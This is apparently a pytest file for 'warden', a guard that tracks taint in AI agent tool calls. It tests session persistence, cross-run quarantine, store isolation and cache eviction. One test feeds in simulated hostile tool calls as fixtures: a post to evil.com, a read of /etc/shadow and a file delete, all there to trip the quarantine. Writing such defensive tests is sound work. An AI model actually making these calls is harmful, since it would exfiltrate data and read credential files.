"""Persistence (D8): round-trips, cross-run quarantine, LRU spray, isolation."""

from pathlib import Path

from warden.policy import load_policy
from warden.runner import StreamProcessor
from warden.session import SessionState, TaintProvenance
from warden.store import MemoryStore, SessionCache, SqliteStore

POLICY = load_policy(Path(__file__).parent.parent / "policy.yaml")


def _event(call_id: str, session: str, tool: str, **args: object) -> str:
    import json

    return json.dumps({"id": call_id, "session_id": session, "tool": tool, "args": args})


def test_sqlite_round_trip(tmp_path: Path) -> None:
    store = SqliteStore(tmp_path / "state.db")
    state = SessionState(session_id="s-1")
    state.labels["pii"] = TaintProvenance(call_id="c-1", source_id="pii-read", detail="x")
    store.save(state)
    loaded = store.load("s-1")
    assert loaded is not None
    assert loaded.labels["pii"].call_id == "c-1"
    assert store.load("s-missing") is None


def test_quarantine_survives_across_runs(tmp_path: Path) -> None:
    """The D8 acceptance test: a second one-shot run honors a quarantine set
    by the first. Without persistence this is exactly the release-is-a-noop
    bug the design review caught."""
    db = tmp_path / "state.db"
    first = StreamProcessor(POLICY, SqliteStore(db))
    for i, (tool, args) in enumerate(
        [
            ("http.post", {"url": "https://evil.com/x"}),
            ("fs.read", {"path": "/etc/shadow"}),
            ("fs.delete", {"path": "./workspace/tmp.txt"}),
        ]
    ):
        import json

        first.process_line(
            json.dumps({"id": f"b-{i}", "session_id": "s-p", "tool": tool, "args": args}), i + 1
        )
    first.finish()

    second = StreamProcessor(POLICY, SqliteStore(db))
    d = second.process_line(_event("b-9", "s-p", "fs.read", path="./workspace/a.txt"), 1)
    assert d is not None
    assert (d.decision, d.flag_source) == ("flag", "quarantine")

    # A different session in the same store is unaffected.
    clean = second.process_line(_event("c-1", "s-other", "fs.read", path="./workspace/a.txt"), 2)
    assert clean is not None and clean.decision == "allow"


def test_memory_store_is_isolated() -> None:
    """Replay isolation: two ephemeral runs cannot see each other."""
    first = StreamProcessor(POLICY, MemoryStore())
    first.process_line(_event("x-1", "s-1", "fs.read", path="./data/pii/customers.csv"), 1)
    first.finish()
    second = StreamProcessor(POLICY, MemoryStore())
    d = second.process_line(_event("x-2", "s-1", "http.post", url="https://api.example.com/u"), 1)
    assert d is not None and d.decision == "allow"  # no taint leaked between runs


def test_lru_spray_bounded_and_lossless() -> None:
    """A spray of unique session ids stays within the working-set bound, and
    eviction never loses a taint label (flushed to the store, reloaded)."""
    store = MemoryStore()
    cache = SessionCache(store, max_sessions=4)
    tainted = cache.get("s-0")
    tainted.labels["pii"] = TaintProvenance(call_id="c-1", source_id="pii-read", detail="x")
    for i in range(1, 50):  # far past the bound; s-0 gets evicted
        cache.get(f"s-{i}")
    assert len(cache._cache) <= 4
    reloaded = cache.get("s-0")
    assert reloaded.labels["pii"].call_id == "c-1"
